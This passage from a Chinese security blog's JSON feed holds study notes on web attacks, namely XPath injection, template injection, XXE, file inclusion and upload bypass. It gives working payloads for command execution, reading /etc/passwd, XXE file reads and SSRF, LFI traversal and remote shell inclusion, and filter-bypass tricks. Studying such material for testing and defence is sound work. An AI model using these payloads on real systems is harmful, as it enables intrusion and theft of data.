id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbXlsdXR0ZS9hcnRpY2xlL2RldGFpbHMvNTA4MTkxNDYjMTAwMDYtd2VpeGluLTEtNTI2MjYtNmIzYmZmZDAxZmRkZTQ5MDAxMzBiYzVhMjc1MWI2ZDE=\">水平越权漏洞及其解决方案</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjAyOQ==\">细说验证码安全 测试思路大梳理</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "逻辑"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/",
            "title": "Xpath",
            "date_published": "2022-11-27T02:44:09.000Z",
            "content_html": "<h1 id=\"xpath定义\"><a class=\"anchor\" href=\"#xpath定义\">#</a> Xpath 定义</h1>\n<p>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</p>\n<h1 id=\"xpath注入攻击原理\"><a class=\"anchor\" href=\"#xpath注入攻击原理\">#</a> Xpath 注入攻击原理</h1>\n<blockquote>\n<p>XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。</p>\n</blockquote>\n<p>在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user 表中的用户名 （username）和密码（password）的结果来进行授权访问，</p>\n<p>例存在 user.xml 文件如下：</p>\n<pre><code>&lt;users&gt;\n     &lt;user&gt;\n         &lt;firstname&gt;Ben&lt;/firstname&gt;\n         &lt;lastname&gt;Elmore&lt;/lastname&gt;\n         &lt;loginID&gt;abc&lt;/loginID&gt;\n         &lt;password&gt;test123&lt;/password&gt;\n     &lt;/user&gt;\n     &lt;user&gt;\n         &lt;firstname&gt;Shlomy&lt;/firstname&gt;\n         &lt;lastname&gt;Gantz&lt;/lastname&gt;\n         &lt;loginID&gt;xyz&lt;/loginID&gt;\n         &lt;password&gt;123test&lt;/password&gt;\n     &lt;/user&gt;\n</code></pre>\n<p>则在 XPath 中其典型的查询语句为：  <code>//users/user[loginID/text()='xyz'and password/text()='123test']</code></p>\n<p>但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如  <code>loginID = 'xyz' 和 password = '123test'</code>  ，则该查询语句将返回 true。但如果用户传入类似  <code>' or 1=1 or ''='</code>  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： <code>//users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']</code></p>\n<p>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。</p>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "Xpath"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "模板注入",
            "date_published": "2022-11-27T01:51:54.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>\n<h1 id=\"测试方法\"><a class=\"anchor\" href=\"#测试方法\">#</a> 测试方法</h1>\n<ul>\n<li>确定使用的引擎</li>\n<li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li>\n<li>需找攻击面，尝试攻击</li>\n</ul>\n<h1 id=\"测试用例\"><a class=\"anchor\" href=\"#测试用例\">#</a> 测试用例</h1>\n<ul>\n<li>\n<p>简单的数学表达式， <code>&#123;&#123; 7+7 &#125;&#125; =&gt; 14</code></p>\n</li>\n<li>\n<p>字符串表达式  <code>&#123;&#123; \"ajin\" &#125;&#125; =&gt; ajin</code></p>\n</li>\n<li>\n<p>Ruby</p>\n<ul>\n<li><code>&lt;%= 7 * 7 %&gt;</code></li>\n<li><code>&lt;%= File.open('/etc/passwd').read %&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>Java</p>\n<ul>\n<li><code>$&#123;7*7&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Twig</p>\n<ul>\n<li><code>&#123;&#123;7*7&#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Smarty</p>\n<ul>\n<li><code>&#123;php&#125;echo `id`;&#123;/php&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>AngularJS</p>\n<ul>\n<li><code>$eval('1+1')</code></li>\n</ul>\n</li>\n<li>\n<p>Tornado</p>\n<ul>\n<li>引用模块  <code>&#123;% import module %&#125;</code></li>\n<li>=&gt;  <code>&#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Flask/Jinja2</p>\n<ul>\n<li><code>&#123;&#123; config &#125;&#125;</code></li>\n<li><code>&#123;&#123; config.items() &#125;&#125;</code></li>\n<li><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></li>\n<li><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code></li>\n<li><code>&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;</code></li>\n<li><code>&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Django</p>\n<ul>\n<li><code>&#123;&#123; request &#125;&#125;</code></li>\n<li><code>&#123;% debug %&#125;</code></li>\n<li><code>&#123;% load module %&#125;</code></li>\n<li><code>&#123;% include \"x.html\" %&#125;</code></li>\n<li><code>&#123;% extends \"x.html\" %&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h1>\n<ul>\n<li>创建对象</li>\n<li>文件读写</li>\n<li>远程文件包含</li>\n<li>信息泄漏</li>\n<li>提权</li>\n</ul>\n<h1 id=\"相关属性\"><a class=\"anchor\" href=\"#相关属性\">#</a> 相关属性</h1>\n<h2 id=\"__class__\"><a class=\"anchor\" href=\"#__class__\">#</a>  <code>__class__</code></h2>\n<p>python 中的新式类（即显示继承 object 对象的类）都有一个属性  <code>__class__</code>  用于获取当前实例对应的类，例如  <code>&quot;&quot;.__class__</code>  就可以获取到字符串实例对应的类</p>\n<h2 id=\"__mro__\"><a class=\"anchor\" href=\"#__mro__\">#</a>  <code>__mro__</code></h2>\n<p>python 中类对象的  <code>__mro__</code>  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。</p>\n<h2 id=\"__globals__\"><a class=\"anchor\" href=\"#__globals__\">#</a>  <code>__globals__</code></h2>\n<p>保存了函数所有的所有全局变量，在利用中，可以使用  <code>__init__</code>  获取对象的函数，并通过  <code>__globals__</code>  获取  <code>file</code>   <code>os</code>  等模块以进行下一步的利用</p>\n<h2 id=\"__subclasses__\"><a class=\"anchor\" href=\"#__subclasses__\">#</a>  <code>__subclasses__()</code></h2>\n<p>python 的新式类都保留了它所有的子类的引用， <code>__subclasses__()</code>  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>\n<p>因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  <code>__subclasses__()</code>  方法就可以获取想要的类的对象。</p>\n<h1 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h1>\n<ul>\n<li><code>().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</code></li>\n<li><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()' )</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<h2 id=\"字符串拼接\"><a class=\"anchor\" href=\"#字符串拼接\">#</a> 字符串拼接</h2>\n<pre><code>request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]\n</code></pre>\n<h2 id=\"使用参数绕过\"><a class=\"anchor\" href=\"#使用参数绕过\">#</a> 使用参数绕过</h2>\n<pre><code>params = &#123;\n    'clas': '__class__',\n    'mr': '__mro__',\n    'subc': '__subclasses__'\n&#125;\ndata = &#123;\n    &quot;data&quot;: &quot;&#123;&#123;''[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;\n&#125;\nr = requests.post(url, params=params, data=data)\nprint(r.text)\n</code></pre>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模版注入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==\">用 Python 特性任意代码执行</span></li>\n</ul>\n",
            "tags": [
                "注入",
                "绕过"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/",
            "title": "XXE",
            "date_published": "2022-11-27T01:31:19.000Z",
            "content_html": "<h1 id=\"xml基础\"><a class=\"anchor\" href=\"#xml基础\">#</a> XML 基础</h1>\n<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>\n<h1 id=\"基本语法\"><a class=\"anchor\" href=\"#基本语法\">#</a> 基本语法</h1>\n<p>XML 文档在开头有  <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。</p>\n<p>除了可选的开头外，XML 语法主要有以下的特性：</p>\n<ul>\n<li>所有 XML 元素都须有关闭标签</li>\n<li>XML 标签对大小写敏感</li>\n<li>XML 必须正确地嵌套</li>\n<li>XML 文档必须有根元素</li>\n<li>XML 的属性值需要加引号</li>\n</ul>\n<p>另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。</p>\n<h1 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h1>\n<p>当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。</p>\n<h1 id=\"攻击方式\"><a class=\"anchor\" href=\"#攻击方式\">#</a> 攻击方式</h1>\n<h2 id=\"拒绝服务攻击\"><a class=\"anchor\" href=\"#拒绝服务攻击\">#</a> 拒绝服务攻击</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a0</span> <span class=\"token attr-name\">\"dos\"</span> <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a1</span> <span class=\"token attr-name\">\"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a2</span> <span class=\"token attr-name\">\"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&a2;\">&amp;a2;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>\n<h2 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&file;\">&amp;file;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"http://publicServer.com/\"</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span>4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> RCE</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">GVI</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">foo</span> <span class=\"token attr-name\">ANY</span> <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY xxe SYSTEM \"expect://id\" ></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>catalog</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>core</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>test101<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>description</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>description</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>core</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>catalog</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"xinclude\"><a class=\"anchor\" href=\"#xinclude\">#</a> XInclude</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version='1.0'?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XInclude<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">xi:</span>include</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://publicServer.com/file.xml<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">xi:</span>include</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24veG1sLw==\">XML 教程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvNjk=\">未知攻焉知防 XXE 漏洞攻防</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTc4MzMuaHRtbA==\">XXE 攻击笔记分享</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4Nw==\">从 XML 相关一步一步到 XXE 漏洞</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "XXE",
                "XML"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "title": "文件包含",
            "date_published": "2022-11-26T13:02:44.000Z",
            "content_html": "<h2 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h2>\n<p>常见的文件包含漏洞的形式为  <code>&lt;?php include(&quot;inc/&quot; . $_GET['file']); ?&gt;</code></p>\n<p>考虑常用的几种包含方式为</p>\n<ul>\n<li>同目录包含  <code>file=.htaccess</code></li>\n<li>目录遍历  <code>?file=../../../../../../../../../var/lib/locate.db</code></li>\n<li>日志注入  <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>\n<li>利用  <code>/proc/self/environ</code></li>\n</ul>\n<p>其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试</p>\n<h2 id=\"触发sink\"><a class=\"anchor\" href=\"#触发sink\">#</a> 触发 Sink</h2>\n<ul>\n<li>PHP\n<ul>\n<li>include\n<ul>\n<li>在包含过程中出错会报错，不影响执行后续语句</li>\n</ul>\n</li>\n<li>include_once\n<ul>\n<li>仅包含一次</li>\n</ul>\n</li>\n<li>require\n<ul>\n<li>在包含过程中出错，就会直接退出，不执行后续语句</li>\n</ul>\n</li>\n<li>require_once</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h2>\n<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>\n<h3 id=\"url编码绕过\"><a class=\"anchor\" href=\"#url编码绕过\">#</a> url 编码绕过</h3>\n<p>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过</p>\n<h3 id=\"特殊字符绕过\"><a class=\"anchor\" href=\"#特殊字符绕过\">#</a> 特殊字符绕过</h3>\n<ul>\n<li>某些情况下，读文件支持使用 Shell 通配符，如  <code>?</code>   <code>*</code>  等</li>\n<li>url 中 使用  <code>?</code>   <code>#</code>  可能会影响 include 包含的结果</li>\n<li>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</li>\n</ul>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>几乎是最常用的方法，条件是  <code>magic_quotes_gpc</code>  关闭，而且 php 版本小于 5.3.4。</p>\n<h3 id=\"长度截断\"><a class=\"anchor\" href=\"#长度截断\">#</a> 长度截断</h3>\n<p>Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。</p>\n<p>msdn 定义  <code>#define MAX_PATH 260</code> ，其中第 260 个字符为字符串结尾的  <code>\\0</code>  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。</p>\n<p>获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255</p>\n<p>那么在长度有限的时候， <code>././././</code>  (n 个) 的形式就可以通过这个把路径爆掉</p>\n<p>在 php 代码包含中，这种绕过方式要求 php 版本 &lt; php 5.2.8</p>\n<h3 id=\"伪协议绕过\"><a class=\"anchor\" href=\"#伪协议绕过\">#</a> 伪协议绕过</h3>\n<ul>\n<li>远程包含：要求  <code>allow_url_fopen=On</code>  且  <code>allow_url_include=On</code>  ， payload 为  <code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code>  的形式</li>\n<li>PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  <code>allow_url_include=On</code>  ，payload 为  <code>?file=php://input</code>  的形式</li>\n<li>Base64: 使用 Base64 伪协议读取文件，payload 为  <code>?file=php://filter/convert.base64-encode/resource=index.php</code>  的形式</li>\n<li>data: 使用 data 伪协议读取文件，payload 为  <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>  的形式，要求  <code>allow_url_include=On</code></li>\n</ul>\n<h3 id=\"协议绕过\"><a class=\"anchor\" href=\"#协议绕过\">#</a> 协议绕过</h3>\n<p><code>allow_url_fopen</code>  和  <code>allow_url_include</code>  主要是针对  <code>http</code>   <code>ftp</code>  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=\">Exploit with PHP Protocols</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==\">lfi cheat sheet</span></li>\n</ul>\n",
            "tags": [
                "包含",
                "文件",
                "目录"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "title": "文件上传",
            "date_published": "2022-11-26T12:58:44.000Z",
            "content_html": "<h1 id=\"文件类型检测绕过\"><a class=\"anchor\" href=\"#文件类型检测绕过\">#</a> 文件类型检测绕过</h1>\n<h2 id=\"更改请求绕过\"><a class=\"anchor\" href=\"#更改请求绕过\">#</a> 更改请求绕过</h2>\n<p>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如  <code>Content-Type</code>  等，这种检查同样可以通过修改网络请求绕过。</p>\n<h2 id=\"magic检测绕过\"><a class=\"anchor\" href=\"#magic检测绕过\">#</a> Magic 检测绕过</h2>\n<p>有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>十六进制值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>JPG</td>\n<td>FF D8 FF E0 00 10 4A 46 49 46</td>\n</tr>\n<tr>\n<td>GIF</td>\n<td>47 49 46 38 39 61</td>\n</tr>\n<tr>\n<td>PNG</td>\n<td>89 50 4E 47</td>\n</tr>\n<tr>\n<td>TIF</td>\n<td>49 49 2A 00</td>\n</tr>\n<tr>\n<td>BMP</td>\n<td>42 4D</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"后缀绕过\"><a class=\"anchor\" href=\"#后缀绕过\">#</a> 后缀绕过</h2>\n<p>部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。</p>\n<p>php 由于历史原因，部分解释器可能支持符合正则  <code>/ph(p[2-7]?|t(ml)?)/</code>  的后缀，如  <code>php</code>  /  <code>php5</code>  /  <code>pht</code>  /  <code>phtml</code>  /  <code>shtml</code>  /  <code>pwml</code>  /  <code>phtm</code>  等 可在禁止上传 php 文件时测试该类型。</p>\n<p>jsp 引擎则可能会解析  <code>jspx</code>  /  <code>jspf</code>  /  <code>jspa</code>  /  <code>jsw</code>  /  <code>jsv</code>  /  <code>jtml</code>  等后缀，asp 支持  <code>asa</code>  /  <code>asax</code>  /  <code>cer</code>  /  <code>cdx</code>  /  <code>aspx</code>  /  <code>ascx</code>  /  <code>ashx</code>  /  <code>asmx</code>  /  <code>asp&#123;80-90&#125;</code>  等后缀。</p>\n<p>除了这些绕过，其他的后缀同样可能带来问题，如  <code>vbs</code>  /  <code>asis</code>  /  <code>sh</code>  /  <code>reg</code>  /  <code>cgi</code>  